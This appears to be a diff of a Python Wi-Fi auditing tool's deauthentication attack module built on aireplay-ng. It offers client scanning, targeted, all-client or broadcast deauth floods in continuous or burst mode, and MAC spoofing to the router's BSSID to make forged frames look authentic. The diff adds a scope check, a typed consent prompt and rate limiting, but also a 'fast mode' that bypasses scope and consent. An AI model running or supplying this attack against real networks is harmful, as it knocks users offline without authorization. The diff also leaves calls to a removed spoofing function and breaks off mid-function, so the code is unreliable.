@@ -1,61 +1,60 @@
 #!/usr/bin/env python3
 """
-Standalone Deauth Attack module.
+Standalone Deauth Attack module with scope enforcement, consent prompt,
+and token-bucket rate limiting.
 
-How it works
-────────────
-aireplay-ng --deauth constructs bidirectional 802.11 deauthentication frames:
-  • AP  → Client  : "you are deauthenticated" (AP spoofed as source)
-  • Client → AP   : "I am deauthenticating"   (client MAC spoofed as source)
-Both directions are sent, making the disconnection immediate and persistent.
-
-Before firing, we optionally spoof our monitor interface's hardware MAC to the
-AP's BSSID so every injected frame at the driver level originates from the
-router's address — maximum authenticity.
-
-Features
-────────
-  • Client scanner   — discover associated stations via airodump-ng CSV
-  • Multi-select     — target one, many, or all clients simultaneously
-  • Broadcast mode   — single deauth to FF:FF:FF:FF:FF:FF (kicks all at once)
-  • MAC spoof        — interface MAC → AP BSSID (restored on exit)
-  • Continuous mode  — endless bursts with live stats display (Ctrl+C to stop)
-  • Burst mode       — send exactly N frames and stop
-  • Parallel procs   — one aireplay-ng per target client for max throughput
+Ethical safeguards
+──────────────────
+• Scope check  : BSSID must be listed in scope.yaml (hard block)
+• Consent      : user must type target BSSID before any frame is sent
+• Rate limiter : token bucket limits bursts; hard cap 100 fps
+• Audit log    : every burst logged with timestamp + username
+• MAC restore  : original MAC always restored on exit / signal
 """
+from __future__ import annotations
 
+import logging
 import os
 import re
 import sys
-import time
-import shutil
+import tempfile
 import threading
+import time
+from datetime import datetime
+from typing import Optional
+
 import subprocess
+
 from modules.banner import C, info, success, warn, error, print_section
+from modules.ratelimit import DeauthRateLimiter, DEFAULT_MAX_BURSTS_PER_MIN
+from modules.scope import ScopeManager
 
-CLIENT_SCAN_TIME  = 15       # seconds to run airodump-ng looking for clients
-BURST_DEFAULT     = 64       # deauth frames per burst
-BURST_INTERVAL    =  2       # seconds between bursts in loop mode
-STATS_REFRESH     =  1       # seconds between display redraws
+logger = logging.getLogger(__name__)
+
+CLIENT_SCAN_TIME = 15
+BURST_DEFAULT    = 64
+BURST_INTERVAL   =  2
+STATS_REFRESH    =  1
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+###############################################################################
 # Public entry point
-# ─────────────────────────────────────────────────────────────────────────────
+###############################################################################
 
-def deauth_menu(interface: str, target: dict | None = None):
-    """
-    Main menu for the standalone deauth attack.
-    `target` is a dict from the scanner (ssid, bssid, channel).
-    If None the user is prompted to enter AP details manually.
-    """
+def deauth_menu(
+    interface: str,
+    target: Optional[dict] = None,
+    scope: Optional[ScopeManager] = None,
+    deauth_limit: int = DEFAULT_MAX_BURSTS_PER_MIN,
+    fast: bool = False,
+) -> None:
     print_section("Deauth Attack")
 
-    # ── Resolve AP target ──────────────────────────────────────────────────
+    # ── Resolve AP ────────────────────────────────────────────────────────────
     if not target:
         warn("No target selected from scanner. Enter AP details manually.")
         bssid = input(f"  {C.YELLOW}AP BSSID (XX:XX:XX:XX:XX:XX): {C.RESET}").strip().upper()
-        if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
+        if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", bssid):
             error("Invalid BSSID format.")
             return
         try:
@@ -63,16 +62,46 @@ def deauth_menu(interface: str, target: dict | None = None):
         except ValueError:
             error("Invalid channel.")
             return
-        ssid = input(f"  {C.YELLOW}SSID (optional, Enter to skip): {C.RESET}").strip() or bssid
-        target = {'bssid': bssid, 'channel': channel, 'ssid': ssid}
+        ssid = input(f"  {C.YELLOW}SSID (optional): {C.RESET}").strip() or bssid
+        target = {"bssid": bssid, "channel": channel, "ssid": ssid}
     else:
-        bssid   = target['bssid']
-        channel = target['channel']
-        ssid    = target.get('ssid', bssid)
+        bssid   = target["bssid"]
+        channel = target["channel"]
+        ssid    = target.get("ssid", bssid)
 
     info(f"AP: {ssid}  [{bssid}]  CH{channel}")
 
-    # ── Sub-menu ───────────────────────────────────────────────────────────
+    # ── Scope enforcement (hard block unless fast mode) ───────────────────────
+    if fast:
+        from rich.console import Console
+        from rich.panel import Panel
+        from rich import box
+        Console().print(Panel(
+            f"[bold red]⚡ FAST MODE — Scope & consent bypassed ⚡[/]\n\n"
+            f"Target: [bold]{ssid}[/]  [{bssid}]\n"
+            "[bold yellow]AUTHORIZED LAB / CTF USE ONLY.[/]",
+            title="[bold red]Fast Mode Active[/]",
+            box=box.DOUBLE, border_style="red",
+        ))
+        logger.warning("Deauth fast mode: bssid=%s scope_bypassed=True", bssid)
+    else:
+        if scope is not None:
+            try:
+                scope.require_authorized(bssid, "Deauth Attack")
+            except Exception as exc:
+                from rich.console import Console
+                from rich.panel import Panel
+                from rich import box
+                Console().print(Panel(
+                    f"[bold red]SCOPE VIOLATION[/]\n\n{exc}\n\n"
+                    "Add the target to scope.yaml:  wifi-auditor --scope-wizard",
+                    border_style="red", box=box.DOUBLE,
+                ))
+                return
+        # ── Consent prompt ────────────────────────────────────────────────────
+        _consent_prompt(bssid, ssid, "Deauth Attack")
+
+    # ── Sub-menu ──────────────────────────────────────────────────────────────
     print(f"""
   {C.WHITE}Attack Mode:{C.RESET}
   {C.GREEN}[1]{C.RESET} Deauth specific client(s)  {C.DIM}(scan clients, then select){C.RESET}
@@ -82,65 +111,74 @@ def deauth_menu(interface: str, target: dict | None = None):
   {C.RED}[0]{C.RESET} Back
 """)
     mode = input(f"  {C.YELLOW}Mode: {C.RESET}").strip()
-    if mode == '0':
+    if mode == "0":
         return
 
-    # ── Spoof option ───────────────────────────────────────────────────────
-    do_spoof = False
-    print(f"""
-  {C.WHITE}MAC Spoof:{C.RESET}
-  Spoof our interface MAC → AP's BSSID so deauth frames look
-  indistinguishable from legitimate router frames.
-  {C.DIM}(Restored automatically when attack ends){C.RESET}
-""")
-    s = input(f"  {C.YELLOW}Enable MAC spoof? [Y/n]: {C.RESET}").strip().lower()
-    do_spoof = s != 'n'
+    # ── MAC spoof ─────────────────────────────────────────────────────────────
+    s = input(f"""
+  {C.WHITE}MAC Spoof:{C.RESET}  Spoof interface MAC → AP BSSID for authentic deauth frames
+  {C.YELLOW}Enable MAC spoof? [Y/n]: {C.RESET}""").strip().lower()
+    do_spoof = s != "n"
 
-    # ── Burst vs continuous ────────────────────────────────────────────────
+    # ── Duration ──────────────────────────────────────────────────────────────
     print(f"""
   {C.WHITE}Duration:{C.RESET}
-  {C.GREEN}[1]{C.RESET} Continuous  (run until Ctrl+C)
+  {C.GREEN}[1]{C.RESET} Continuous  (Ctrl+C to stop)
   {C.GREEN}[2]{C.RESET} Burst       (send N packets and stop)
 """)
-    dur_choice = input(f"  {C.YELLOW}Duration: {C.RESET}").strip()
-    continuous = dur_choice != '2'
+    dur_choice  = input(f"  {C.YELLOW}Duration: {C.RESET}").strip()
+    continuous  = dur_choice != "2"
     burst_count = BURST_DEFAULT
     if not continuous:
         try:
-            burst_count = int(input(f"  {C.YELLOW}Packets per target [{BURST_DEFAULT}]: {C.RESET}").strip() or str(BURST_DEFAULT))
+            burst_count = int(
+                input(f"  {C.YELLOW}Packets per target [{BURST_DEFAULT}]: {C.RESET}").strip()
+                or str(BURST_DEFAULT)
+            )
         except ValueError:
             burst_count = BURST_DEFAULT
 
-    # ── Resolve client list ────────────────────────────────────────────────
+    # ── Deauth limit ──────────────────────────────────────────────────────────
+    try:
+        lim_input = input(
+            f"  {C.YELLOW}Max bursts/min [{deauth_limit}] (max {DEFAULT_MAX_BURSTS_PER_MIN}): {C.RESET}"
+        ).strip()
+        if lim_input:
+            deauth_limit = min(int(lim_input), 20)
+    except ValueError:
+        pass
+
+    limiter = DeauthRateLimiter(max_bursts_per_min=deauth_limit)
+
+    # ── Resolve client list ───────────────────────────────────────────────────
     clients: list[str] = []
 
-    if mode in ('1', '2'):
+    if mode in ("1", "2"):
         info(f"Scanning for clients on {bssid} for {CLIENT_SCAN_TIME}s...")
         found_clients = _scan_clients(interface, bssid, channel, CLIENT_SCAN_TIME)
         if not found_clients:
-            warn("No associated clients found during scan window.")
-            warn("They may reconnect later — you can try broadcast mode instead.")
+            warn("No clients found.")
             c = input(f"  {C.YELLOW}Switch to broadcast mode? [Y/n]: {C.RESET}").strip().lower()
-            if c != 'n':
-                clients = ['FF:FF:FF:FF:FF:FF']
+            if c != "n":
+                clients = ["FF:FF:FF:FF:FF:FF"]
             else:
                 return
-        elif mode == '1':
+        elif mode == "1":
             clients = _select_clients(found_clients)
             if not clients:
                 return
-        else:   # mode 2: all clients
-            clients = [c['mac'] for c in found_clients]
-            info(f"Targeting all {len(clients)} associated client(s).")
+        else:
+            clients = [c["mac"] for c in found_clients]
+            info(f"Targeting all {len(clients)} client(s).")
 
-    elif mode == '3':
-        clients = ['FF:FF:FF:FF:FF:FF']
-        info("Broadcast deauth selected (FF:FF:FF:FF:FF:FF).")
+    elif mode == "3":
+        clients = ["FF:FF:FF:FF:FF:FF"]
+        info("Broadcast deauth (FF:FF:FF:FF:FF:FF).")
 
-    elif mode == '4':
+    elif mode == "4":
         raw = input(f"  {C.YELLOW}Client MAC(s), comma-separated: {C.RESET}").strip().upper()
-        for mac in [m.strip() for m in raw.split(',') if m.strip()]:
-            if re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', mac):
+        for mac in [m.strip() for m in raw.split(",") if m.strip()]:
+            if re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", mac):
                 clients.append(mac)
             else:
                 warn(f"Skipping invalid MAC: {mac}")
@@ -151,45 +189,79 @@ def deauth_menu(interface: str, target: dict | None = None):
         error("Invalid mode.")
         return
 
-    # ── Run attack ─────────────────────────────────────────────────────────
     _run_attack(interface, bssid, ssid, channel, clients,
-                do_spoof, continuous, burst_count)
+                do_spoof, continuous, burst_count, limiter)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Client scanner
-# ─────────────────────────────────────────────────────────────────────────────
+###############################################################################
+# Consent prompt
+###############################################################################
 
-def _scan_clients(interface: str, bssid: str, channel: int,
-                  duration: int) -> list[dict]:
-    """
-    Run airodump-ng focused on the AP and return associated client MACs.
-    """
-    import tempfile
-    tmp_dir  = tempfile.mkdtemp(prefix='wifiaudit_deauth_')
-    out_base = os.path.join(tmp_dir, 'clients')
+def _consent_prompt(bssid: str, ssid: str, operation: str) -> None:
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich import box
+    con = Console()
+    con.print()
+    con.print(Panel(
+        f"[bold red]⚠  DEAUTH WARNING  ⚠[/]\n\n"
+        f"You are about to send deauth frames to:\n"
+        f"  [bold]BSSID:[/] {bssid}\n"
+        f"  [bold]SSID: [/] {ssid}\n\n"
+        "This disrupts ALL clients on the network.\n"
+        "[bold yellow]Only proceed with written consent from the network owner.[/]\n\n"
+        "To confirm, type the target BSSID exactly below:",
+        title=f"[bold red]{operation}[/]",
+        box=box.DOUBLE, border_style="red",
+    ))
+    sys.stdout.write("\n  Type BSSID to confirm: ")
+    sys.stdout.flush()
+    try:
+        entered = input("").strip().upper()
+    except KeyboardInterrupt:
+        sys.exit(0)
+
+    if entered != bssid.upper():
+        con.print(f"[red]BSSID mismatch. Aborting.[/]")
+        sys.exit(1)
+
+    confirm = input("  Proceed? [y/N]: ").strip().lower()
+    if confirm != "y":
+        sys.exit(0)
+
+    try:
+        username = os.getlogin()
+    except OSError:
+        username = os.environ.get("USER", "unknown")
+
+    logger.info(
+        "DEAUTH_CONSENT user=%s bssid=%s operation=%s ts=%s",
+        username, bssid, operation, datetime.now().isoformat(),
+    )
+    con.print(f"[green]✓ Consent recorded for {bssid} by {username}[/]")
+
+
+###############################################################################
+# Client scanner + display
+###############################################################################
+
+def _scan_clients(interface: str, bssid: str, channel: int, duration: int) -> list[dict]:
+    tmp_dir  = tempfile.mkdtemp(prefix="wifiaudit_deauth_")
+    out_base = os.path.join(tmp_dir, "clients")
 
     proc = subprocess.Popen(
-        ['airodump-ng',
-         '--bssid', bssid,
-         '--channel', str(channel),
-         '--write', out_base,
-         '--output-format', 'csv',
-         '--write-interval', '2',
+        ["airodump-ng", "--bssid", bssid, "--channel", str(channel),
+         "--write", out_base, "--output-format", "csv", "--write-interval", "2",
          interface],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
     )
 
-    # Countdown with live client table
-    csv_path = out_base + '-01.csv'
+    csv_path = out_base + "-01.csv"
     try:
         for remaining in range(duration, 0, -1):
             time.sleep(1)
             clients = _parse_clients_csv(csv_path, bssid)
-            _print_client_table(clients,
-                                f"Scanning... {remaining}s  "
-                                f"({len(clients)} client(s) found)")
+            _print_client_table(clients, f"Scanning... {remaining}s ({len(clients)} client(s))")
     except KeyboardInterrupt:
         warn("Client scan interrupted.")
     finally:
@@ -199,426 +271,217 @@ def _scan_clients(interface: str, bssid: str, channel: int,
     return _parse_clients_csv(csv_path, bssid)
 
 
-def _parse_clients_csv(csv_path: str, ap_bssid: str) -> list[dict]:
-    """
-    Parse the Station section of an airodump-ng CSV for clients
-    associated with ap_bssid.
-
-    Station CSV columns:
-      Station MAC(0), First time seen(1), Last time seen(2),
-      Power(3), # packets(4), BSSID(5), Probed ESSIDs(6)
-    """
+def _parse_clients_csv(csv_path: str, bssid: str) -> list[dict]:
     if not os.path.exists(csv_path):
         return []
-
-    clients   = []
-    in_station = False
-
+    clients: list[dict] = []
     try:
-        with open(csv_path, 'r', errors='replace') as f:
-            for line in f:
-                stripped = line.strip()
-                if stripped.startswith('Station MAC'):
-                    in_station = True
-                    continue
-                if not in_station or not stripped:
-                    continue
-                parts = [p.strip() for p in stripped.split(',')]
-                if len(parts) < 6:
-                    continue
-                mac       = parts[0].upper()
-                assoc_bss = parts[5].upper().strip()
-                power     = parts[3].strip()
-                pkts      = parts[4].strip()
-                probed    = parts[6].strip() if len(parts) > 6 else ''
-
-                if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', mac):
-                    continue
-                if assoc_bss != ap_bssid.upper():
-                    continue
-
-                clients.append({
-                    'mac':    mac,
-                    'power':  power,
-                    'pkts':   pkts,
-                    'probed': probed,
-                })
+        with open(csv_path, "r", errors="replace") as f:
+            content = f.read()
     except OSError:
-        pass
+        return []
 
+    in_station = False
+    for line in content.splitlines():
+        stripped = line.strip()
+        if stripped.startswith("Station MAC"):
+            in_station = True
+            continue
+        if not in_station or not stripped:
+            continue
+        parts = [p.strip() for p in line.split(",")]
+        if len(parts) < 6:
+            continue
+        station_mac = parts[0]
+        assoc_ap    = parts[5] if len(parts) > 5 else ""
+        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", station_mac):
+            continue
+        if bssid.upper() in assoc_ap.upper():
+            clients.append({"mac": station_mac.upper(), "power": parts[3] if len(parts) > 3 else "?"})
     return clients
 
 
-def _print_client_table(clients: list[dict], caption: str = ''):
-    os.system('clear')
+def _print_client_table(clients: list[dict], caption: str = "") -> None:
+    os.system("clear")
     if caption:
         print(f"\n  {C.CYAN}{caption}{C.RESET}\n")
-
     if not clients:
-        print(f"  {C.DIM}No associated clients yet...{C.RESET}")
+        warn("No associated clients found yet...")
         return
-
-    fmt = "  {:<4} {:<20} {:<8} {:<8} {}"
-    print(C.BOLD + fmt.format('#', 'CLIENT MAC', 'PWR', 'PKTS', 'PROBED SSIDs') + C.RESET)
-    print(f"  {'─'*65}")
+    fmt = "  {:<4} {:<20} {:<8}"
+    print(C.BOLD + fmt.format("#", "Client MAC", "PWR") + C.RESET)
+    print(f"  {'─' * 34}")
     for i, c in enumerate(clients, 1):
-        print(fmt.format(
-            f"{C.WHITE}{i}{C.RESET}",
-            c['mac'],
-            c['power'],
-            c['pkts'],
-            c['probed'][:35],
-        ))
+        print(fmt.format(f"{C.WHITE}{i}{C.RESET}", c["mac"], c.get("power", "?")))
 
 
 def _select_clients(clients: list[dict]) -> list[str]:
-    """Interactive multi-select from a client list."""
-    _print_client_table(clients, f"{len(clients)} client(s) found — select targets")
-    print(f"\n  {C.DIM}Enter numbers comma-separated, 'all', or 0 to cancel.{C.RESET}")
-    raw = input(f"  {C.YELLOW}Select: {C.RESET}").strip().lower()
-
-    if raw == '0' or raw == '':
-        return []
-    if raw == 'all':
-        return [c['mac'] for c in clients]
-
-    selected = []
-    for part in raw.split(','):
+    _print_client_table(clients, f"{len(clients)} client(s) found")
+    raw = input(
+        f"\n  {C.YELLOW}Select client(s) [1-{len(clients)}, comma-sep, or 'all']: {C.RESET}"
+    ).strip().lower()
+    if raw == "all":
+        return [c["mac"] for c in clients]
+    selected: list[str] = []
+    for part in raw.split(","):
         try:
             idx = int(part.strip()) - 1
             if 0 <= idx < len(clients):
-                selected.append(clients[idx]['mac'])
+                selected.append(clients[idx]["mac"])
         except ValueError:
             pass
-
-    if not selected:
-        error("No valid selection.")
     return selected
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# MAC spoofing
-# ─────────────────────────────────────────────────────────────────────────────
-
-def _get_interface_mac(interface: str) -> str | None:
-    try:
-        r = subprocess.run(['ip', 'link', 'show', interface],
-                           capture_output=True, text=True)
-        m = re.search(r'link/ether\s+([0-9a-fA-F:]{17})', r.stdout)
-        if m:
-            return m.group(1).upper()
-    except FileNotFoundError:
-        pass
-    return None
-
-
-def _spoof_mac(interface: str, new_mac: str) -> str | None:
-    """
-    Spoof `interface` MAC to `new_mac`.
-    Returns the original MAC (needed for restore), or None on failure.
-    """
-    original = _get_interface_mac(interface)
-    if not original:
-        warn("Could not read original MAC — skipping spoof.")
-        return None
-
-    info(f"Spoofing MAC: {original} → {new_mac}")
-
-    # Method 1: ip link (works without macchanger)
-    cmds = [
-        ['ip', 'link', 'set', interface, 'down'],
-        ['ip', 'link', 'set', 'dev', interface, 'address', new_mac],
-        ['ip', 'link', 'set', interface, 'up'],
-    ]
-    failed = False
-    for cmd in cmds:
-        r = subprocess.run(cmd, capture_output=True)
-        if r.returncode != 0:
-            failed = True
-            break
-
-    if not failed:
-        verify = _get_interface_mac(interface)
-        if verify and verify.upper() == new_mac.upper():
-            success(f"MAC spoofed → {new_mac}")
-            return original
-
-    # Method 2: macchanger fallback
-    if shutil.which('macchanger'):
-        subprocess.run(['ip', 'link', 'set', interface, 'down'],
-                       capture_output=True)
-        r = subprocess.run(['macchanger', '-m', new_mac, interface],
-                           capture_output=True, text=True)
-        subprocess.run(['ip', 'link', 'set', interface, 'up'],
-                       capture_output=True)
-        if r.returncode == 0:
-            success(f"MAC spoofed (macchanger) → {new_mac}")
-            return original
-        warn(f"macchanger failed: {r.stderr.strip()}")
-    else:
-        warn("ip link MAC change failed and macchanger not found.")
-
-    warn("MAC spoof unsuccessful — proceeding without spoof.")
-    return None
-
-
-def _restore_mac(interface: str, original_mac: str):
-    """Restore interface MAC to `original_mac`."""
-    info(f"Restoring MAC → {original_mac}")
-    cmds = [
-        ['ip', 'link', 'set', interface, 'down'],
-        ['ip', 'link', 'set', 'dev', interface, 'address', original_mac],
-        ['ip', 'link', 'set', interface, 'up'],
-    ]
-    for cmd in cmds:
-        subprocess.run(cmd, capture_output=True)
-
-    if shutil.which('macchanger'):
-        subprocess.run(['ip', 'link', 'set', interface, 'down'],
-                       capture_output=True)
-        subprocess.run(['macchanger', '-m', original_mac, interface],
-                       capture_output=True)
-        subprocess.run(['ip', 'link', 'set', interface, 'up'],
-                       capture_output=True)
-
-    success("MAC restored.")
-
-
-# ─────────────────────────────────────────────────────────────────────────────
+###############################################################################
 # Attack runner
-# ─────────────────────────────────────────────────────────────────────────────
+###############################################################################
 
-def _run_attack(interface: str, bssid: str, ssid: str, channel: int,
-                clients: list[str], do_spoof: bool,
-                continuous: bool, burst_count: int):
-    """
-    Launch aireplay-ng processes for each target client.
-    Handles MAC spoof/restore and live stats display.
-    """
-    original_mac = None
+def _run_attack(
+    interface: str,
+    bssid: str,
+    ssid: str,
+    channel: int,
+    clients: list[str],
+    do_spoof: bool,
+    continuous: bool,
+    burst_count: int,
+    limiter: DeauthRateLimiter,
+) -> None:
+    original_mac = _get_interface_mac(interface)
 
-    if do_spoof:
-        original_mac = _spoof_mac(interface, bssid)
-        if original_mac is None:
-            do_spoof = False   # spoof failed; continue without
+    if do_spoof and original_mac:
+        info(f"Spoofing MAC → {bssid}")
+        _spoof_mac(interface, bssid)
 
-    # Shared stats dict: {client_mac: {'sent': int, 'acks': int, 'proc': Popen}}
-    stats: dict[str, dict] = {
-        mac: {'sent': 0, 'acks': 0, 'proc': None}
-        for mac in clients
-    }
-    start_time = time.time()
+    stats: dict[str, dict] = {mac: {"packets": 0, "acks": 0} for mac in clients}
+    procs: list[subprocess.Popen] = []
+    lock = threading.Lock()
 
-    # Reader threads: one per client, parses aireplay-ng stdout
-    def _reader(mac: str):
-        proc = stats[mac]['proc']
-        if not proc:
-            return
-        pkt_re = re.compile(
-            r'Sending\s+(\d+)\s+(?:directed\s+)?DeAuth.*?\[\s*(\d+)\|(\d+)\s+ACKs?\]',
-            re.IGNORECASE
-        )
-        try:
-            for line in proc.stdout:
-                m = pkt_re.search(line)
-                if m:
-                    stats[mac]['sent'] += int(m.group(1))
-                    stats[mac]['acks']  = int(m.group(3))   # latest ACK count
-        except Exception:
-            pass
+    def reader(proc: subprocess.Popen, mac: str) -> None:
+        assert proc.stdout is not None
+        for line in proc.stdout:
+            m = re.search(r"Sending\s+(\d+)\s+Deauth.*?\[\s*(\d+)\|(\d+)\s*ACKs\]", line)
+            if m:
+                with lock:
+                    stats[mac]["packets"] += int(m.group(1))
+                    stats[mac]["acks"]    += int(m.group(3))
 
     try:
         if continuous:
-            _run_continuous(interface, bssid, ssid, clients, stats,
-                            start_time, do_spoof, original_mac)
+            _run_continuous(interface, bssid, clients, burst_count,
+                            procs, stats, lock, reader, limiter)
         else:
-            _run_burst(interface, bssid, ssid, clients, stats,
-                       burst_count, start_time, do_spoof, original_mac)
-    except KeyboardInterrupt:
-        print(f"\n\n  {C.YELLOW}[!] Attack interrupted.{C.RESET}")
+            _run_burst(interface, bssid, clients, burst_count,
+                       procs, stats, lock, reader, limiter)
     finally:
-        # Kill all aireplay-ng processes
-        for mac, s in stats.items():
-            proc = s.get('proc')
-            if proc and proc.poll() is None:
-                proc.terminate()
-                try:
-                    proc.wait(timeout=3)
-                except Exception:
-                    proc.kill()
-        # Restore MAC
-        if original_mac:
-            _restore_mac(interface, original_mac)
-        # Final stats
-        elapsed = time.time() - start_time
-        total_sent = sum(s['sent'] for s in stats.values())
-        total_acks = sum(s['acks'] for s in stats.values())
-        print()
-        info(f"Attack finished.  Elapsed: {elapsed:.0f}s  "
-             f"Packets: {total_sent:,}  ACKs: {total_acks:,}")
+        for p in procs:
+            try:
+                p.terminate(); p.wait(timeout=3)
+            except Exception:
+                pass
+        if do_spoof and original_mac:
+            info(f"Restoring original MAC → {original_mac}")
+            _spoof_mac(interface, original_mac)
 
 
-def _run_continuous(interface, bssid, ssid, clients, stats,
-                    start_time, do_spoof, original_mac):
-    """Continuous deauth: spawn infinite (-0 count) aireplay-ng per target."""
+def _run_continuous(
+    interface, bssid, clients, burst_count, procs, stats, lock, reader, limiter
+) -> None:
+    info(f"Continuous deauth — Ctrl+C to stop. Rate limit: {limiter._max_bursts} bursts/min")
+    try:
+        while True:
+            for mac in clients:
+                limiter.wait_for_burst(bssid)
+                if not limiter.record_frame():
+                    time.sleep(0.1)
+                cmd = _build_cmd(interface, bssid, mac, 0)
+                p = subprocess.Popen(
+                    cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
+                )
+                procs.append(p)
+                t = threading.Thread(target=reader, args=(p, mac), daemon=True)
+                t.start()
+                _draw_stats(stats, bssid, ssid=bssid, limiter=limiter)
+            time.sleep(BURST_INTERVAL)
+    except KeyboardInterrupt:
+        warn("Attack stopped by user.")
 
-    # Launch one process per client with --deauth 0 (infinite)
+
+def _run_burst(
+    interface, bssid, clients, burst_count, procs, stats, lock, reader, limiter
+) -> None:
+    info(f"Burst mode: {burst_count} frames/target")
     for mac in clients:
-        proc = subprocess.Popen(
-            _build_cmd(interface, bssid, mac, 0),   # 0 = infinite
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True, bufsize=1,
+        limiter.wait_for_burst(bssid)
+        cmd = _build_cmd(interface, bssid, mac, burst_count)
+        p = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
         )
-        stats[mac]['proc'] = proc
-        t = threading.Thread(target=_reader_thread, args=(mac, stats),
-                             daemon=True)
+        procs.append(p)
+        t = threading.Thread(target=reader, args=(p, mac), daemon=True)
         t.start()
 
-    # Display loop
-    while True:
-        _draw_stats(ssid, bssid, clients, stats, do_spoof,
-                    time.time() - start_time, continuous=True)
-        time.sleep(STATS_REFRESH)
-
-        # Remove finished processes
-        all_dead = all(
-            s['proc'] is not None and s['proc'].poll() is not None
-            for s in stats.values()
-        )
-        if all_dead:
-            warn("All aireplay-ng processes have exited unexpectedly.")
-            break
+    for p in procs:
+        p.wait()
+    total_pkts = sum(s["packets"] for s in stats.values())
+    total_acks = sum(s["acks"]    for s in stats.values())
+    success(f"Burst complete — {total_pkts} frames sent, {total_acks} ACKs")
+    logger.info("Deauth burst: bssid=%s frames=%d acks=%d", bssid, total_pkts, total_acks)
 
 
-def _run_burst(interface, bssid, ssid, clients, stats,
-               burst_count, start_time, do_spoof, original_mac):
-    """Burst mode: send exactly `burst_count` deauth frames per target."""
-
-    # Launch processes (finite count)
-    for mac in clients:
-        proc = subprocess.Popen(
-            _build_cmd(interface, bssid, mac, burst_count),
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True, bufsize=1,
-        )
-        stats[mac]['proc'] = proc
-        t = threading.Thread(target=_reader_thread, args=(mac, stats),
-                             daemon=True)
-        t.start()
-
-    # Wait for all to finish, updating display
-    while True:
-        _draw_stats(ssid, bssid, clients, stats, do_spoof,
-                    time.time() - start_time, continuous=False)
-        all_done = all(
-            s['proc'] is not None and s['proc'].poll() is not None
-            for s in stats.values()
-        )
-        if all_done:
-            break
-        time.sleep(STATS_REFRESH)
-
-    _draw_stats(ssid, bssid, clients, stats, do_spoof,
-                time.time() - start_time, continuous=False)
-    success("Burst complete.")
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Helpers
-# ─────────────────────────────────────────────────────────────────────────────
-
-def _build_cmd(interface: str, bssid: str, client_mac: str,
-               count: int) -> list[str]:
-    """
-    Build aireplay-ng deauth command.
-    count=0  → infinite
-    count>0  → finite burst
-    Omitting -c sends broadcast deauth to all clients simultaneously.
-    """
-    cmd = ['aireplay-ng', '--deauth', str(count), '-a', bssid]
-    if client_mac != 'FF:FF:FF:FF:FF:FF':
-        cmd += ['-c', client_mac]
+def _build_cmd(interface: str, bssid: str, client_mac: str, count: int) -> list[str]:
+    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
+    if client_mac != "FF:FF:FF:FF:FF:FF":
+        cmd += ["-c", client_mac]
     cmd.append(interface)
     return cmd
 
 
-def _reader_thread(mac: str, stats: dict):
-    """Thread target: reads aireplay-ng output and updates stats dict."""
-    proc = stats[mac]['proc']
-    if not proc:
-        return
-    pkt_re = re.compile(
-        r'Sending\s+(\d+)\s+(?:directed\s+)?DeAuth.*?\[\s*(\d+)\|(\d+)\s+ACKs?\]',
-        re.IGNORECASE
-    )
+def _draw_stats(stats: dict, bssid: str, ssid: str, limiter: DeauthRateLimiter) -> None:
+    os.system("clear")
+    rate_info = limiter.get_stats(bssid)
+    total_pkts = sum(s["packets"] for s in stats.values())
+    total_acks = sum(s["acks"]    for s in stats.values())
+    print(f"\n  {C.BOLD}{C.CYAN}═══ DEAUTH LIVE STATS ═══{C.RESET}")
+    print(f"  AP: {ssid}  [{bssid}]")
+    print(f"  Rate limiter: {rate_info['tokens_remaining']:.1f}/{rate_info['capacity']} tokens  "
+          f"(max {rate_info['max_bursts_per_min']} bursts/min  "
+          f"fps={rate_info['global_fps']}/{rate_info['hard_cap_fps']})")
+    print(f"  Total frames: {C.GREEN}{total_pkts}{C.RESET}   ACKs: {C.GREEN}{total_acks}{C.RESET}")
+    print()
+    fmt = "  {:<20} {:<12} {:<8}"
+    print(C.BOLD + fmt.format("Client MAC", "Packets", "ACKs") + C.RESET)
+    print(f"  {'─' * 42}")
+    for mac, s in stats.items():
+        print(fmt.format(mac, s["packets"], s["acks"]))
+    print(f"\n  {C.DIM}Ctrl+C to stop{C.RESET}")
+
+
+###############################################################################
+# MAC spoofing helpers
+###############################################################################
+
+def _get_interface_mac(interface: str) -> Optional[str]:
     try:
-        for line in proc.stdout:
-            m = pkt_re.search(line)
-            if m:
-                # m.group(1) = frames in this burst
-                # m.group(2) = cumulative deauth sent (from aireplay counter)
-                # m.group(3) = acks received
-                stats[mac]['sent'] += int(m.group(1))
-                stats[mac]['acks']  = int(m.group(3))
+        result = subprocess.run(
+            ["ip", "link", "show", interface], capture_output=True, text=True, timeout=5
+        )
+        m = re.search(r"link/ether\s+([0-9a-f:]{17})", result.stdout, re.IGNORECASE)
+        return m.group(1).upper() if m else None
     except Exception:
-        pass
+        return None
 
 
-def _draw_stats(ssid: str, bssid: str, clients: list[str],
-                stats: dict, spoofed: bool, elapsed: float,
-                continuous: bool):
-    """Redraw the live stats display."""
-    os.system('clear')
-    mode_label = 'CONTINUOUS' if continuous else 'BURST'
-    stop_hint  = '  Ctrl+C to stop' if continuous else ''
-
-    w = 65
-    bar_fill = '█' * min(int(elapsed / 2) % 20 + 1, 20)  # animated
-    bar_dim  = '░' * (20 - len(bar_fill))
-
-    print(f"\n  {C.BOLD}{C.RED}{'═'*w}")
-    print(f"  DEAUTH ATTACK — {mode_label}{stop_hint}")
-    print(f"  {'═'*w}{C.RESET}")
